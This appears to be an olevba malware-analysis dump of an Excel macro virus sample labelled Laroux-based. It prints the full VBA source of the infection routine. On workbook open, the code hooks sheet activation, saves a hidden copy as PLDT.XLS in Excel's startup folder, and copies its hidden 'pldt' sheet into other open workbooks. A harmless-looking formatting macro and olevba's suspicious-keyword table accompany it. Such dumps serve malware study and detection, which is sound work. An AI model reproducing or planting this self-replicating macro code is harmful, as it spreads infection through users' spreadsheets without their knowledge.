olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-49490d612f8a6384bfaefa23612ef91f09165856
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO pldt.bas 
in file: Virus.MSExcel.Laroux-based-49490d612f8a6384bfaefa23612ef91f09165856 - OLE stream: '_VBA_PROJECT_CUR/VBA/pldt'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "PLDT.XLS")
    If m$ = "PLDT.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("pldt").Visible = True
    Sheets("pldt").Select

    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "PLDT.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("pldt").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "PLDT.XLS!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "pldt" Then
        Workbooks("PLDT.XLS").Sheets("pldt").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("pldt").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "PLDT.XLS!check_files"
    Case Else
End Select
End Sub

Sub PCCPO_Macro()
Attribute PCCPO_Macro.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.DisplayAlerts = False
    Workbooks.OpenText FileName:="C:\PCCPO.XLS", Origin:=xlWindows, _
        StartRow:=1, DataType:=xlDelimited, TextQualifier:= _
        xlDoubleQuote, ConsecutiveDelimiter:=False, Tab:=False, _
        Semicolon:=False, Comma:=False, Space:=False, Other:=True, _
        OtherChar:="^", FieldInfo:=Array(Array(1, 1), Array(2, 1), Array(3, 1 _
        ), Array(4, 1), Array(5, 1), Array(6, 1), Array(7, 1), Array(8, 1), Array(9, 1), _
        Array(10, 1), Array(11, 1), Array(12, 1))
    ChDir "C:\"
    Range("A6").Select
    Selection.CurrentRegion.Select
    With Selection.Borders(xlLeft)
        .Weight = xlThin
        .ColorIndex = xlAutomatic
    End With
    With Selection.Borders(xlRight)
        .Weight = xlThin
        .ColorIndex = xlAutomatic
    End With
    With Selection.Borders(xlTop)
        .Weight = xlThin
        .ColorIndex = xlAutomatic
    End With
    With Selection.Borders(xlBottom)
        .Weight = xlThin
        .ColorIndex = xlAutomatic
    End With
    Selection.BorderAround Weight:=xlThin, ColorIndex:=xlAutomatic
    Columns("E:E").Select
    Selection.Cut
    Columns("B:B").Select
    Selection.Insert Shift:=xlToRight
    Columns("J:K").Select
    Selection.Cut
    Columns("H:H").Select
    Selection.Insert Shift:=xlToRight
    Columns("D:D").Select
    Selection.Insert Shift:=xlToRight
    Range("C6").Select
    Application.Run Macro:="PERSONAL.XLS!Selecting_column"
    Selection.TextToColumns Destination:=Range("C6"), DataType:= _
        xlFixedWidth, OtherChar:="^", FieldInfo:=Array(Array(0, 1), Array( _
        9, 1))
    Columns("H:H").Select
    Selection.Cut
    Columns("E:E").Select
    Selection.Insert Shift:=xlToRight
    Columns("K:M").Select
    Selection.Delete Shift:=xlToLeft
    Rows("5:5").Select
    Selection.Delete Shift:=xlUp
    Range("C4").Select
    ActiveCell.FormulaR1C1 = "PO NBR"
    Range("D4").Select
    ActiveCell.FormulaR1C1 = "LINE"
    Range("A4:J4").Select
    Selection.Font.Bold = True
    Selection.Borders(xlLeft).LineStyle = xlNone
    Selection.Borders(xlRight).LineStyle = xlNone
    Selection.Borders(xlTop).LineStyle = xlNone
    With Selection.Borders(xlBottom)
        .Weight = xlMedium
        .ColorIndex = xlAutomatic
    End With
    Selection.BorderAround LineStyle:=xlNone
    Cells.Select
    Selection.Columns.AutoFit
    Range("A4").Select
    Columns("A:A").ColumnWidth = 18.5
    Columns("B:B").ColumnWidth = 30.25
    Range("E4:G4").Select
    With Selection
        .HorizontalAlignment = xlGeneral
        .VerticalAlignment = xlBottom
        .WrapText = True
        .Orientation = xlHorizontal
    End With
    Columns("E:E").ColumnWidth = 6.38
    Rows("4:4").EntireRow.AutoFit
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlBottom
        .WrapText = True
        .Orientation = xlHorizontal
    End With
    Range("G2").Select
    Columns("B:B").ColumnWidth = 29#
    Columns("F:F").ColumnWidth = 5.63
    Columns("F:F").EntireColumn.AutoFit
    Columns("E:E").EntireColumn.AutoFit
    Columns("G:G").ColumnWidth = 7.25
    Columns("G:J").EntireColumn.AutoFit
    Range("A5").Select
    Dim anchor_cell
    anchor_cell = ActiveCell.Address
    ActiveCell.End(xlDown).Select
    ActiveCell.End(xlToRight).Select
    Range(anchor_cell, ActiveCell).Select
    ActiveSheet.PageSetup.PrintArea = Selection.Address
    Range("C5").Select
    ActiveWindow.FreezePanes = True
    With ActiveSheet.PageSetup
        .PrintTitleRows = "$1:$4"
        .PrintTitleColumns = ""
    End With
       With ActiveSheet.PageSetup
        .LeftHeader = ""
        .CenterHeader = "PCCPO.XLS"
        .RightHeader = ""
        .LeftFooter = ""
        .CenterFooter = "Page &P"
        .RightFooter = ""
        .LeftMargin = Application.InchesToPoints(0)
        .RightMargin = Application.InchesToPoints(0)
        .TopMargin = Application.InchesToPoints(1)
        .BottomMargin = Application.InchesToPoints(1)
        .HeaderMargin = Application.InchesToPoints(0.5)
        .FooterMargin = Application.InchesToPoints(0.5)
        .PrintHeadings = False
        .PrintGridlines = False
        .PrintNotes = False
        .PrintQuality = 300
        .CenterHorizontally = True
        .CenterVertically = False
        .Orientation = xlPortrait
        .Draft = False
        .PaperSize = xlPaperLetter
        .FirstPageNumber = xlAutomatic
        .Order = xlDownThenOver
        .BlackAndWhite = False
        .Zoom = 100
    End With
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = "Bob Perkins"
        .Keywords = ""
        .Comments = ""
    Columns("K:M").Select
    Selection.Delete Shift:=xlToLeft
    Range("C5").Select
    End With
    ChDir "C:\"
    ActiveWorkbook.SaveAs FileName:="H:\PHILIPS\POPCC.XLS", FileFormat:=xlNormal, _
        Password:="", WriteResPassword:="", ReadOnlyRecommended:=False _
        , CreateBackup:=False
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     12 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  pld
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

